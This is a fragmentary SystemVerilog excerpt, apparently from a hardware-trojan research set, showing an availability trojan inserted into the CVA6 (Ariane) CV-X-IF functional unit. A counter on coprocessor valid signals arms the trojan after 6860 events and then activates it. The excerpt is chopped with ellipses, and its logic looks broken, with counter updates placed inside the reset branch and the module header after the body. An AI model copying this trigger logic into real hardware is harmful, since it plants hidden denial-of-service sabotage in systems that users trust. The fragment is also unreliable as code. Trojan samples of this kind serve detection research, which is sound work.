...
// Licensed under the Solderpad Hardware Licence, Version 2.0 (the "License");
    ...
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 6860;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (|x_valid_i) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && x_valid_i) trojan_active <= 1'b1;
        end
    end
...
module cvxif_fu_trojan_Availability
  import ariane_pkg::*;
#(
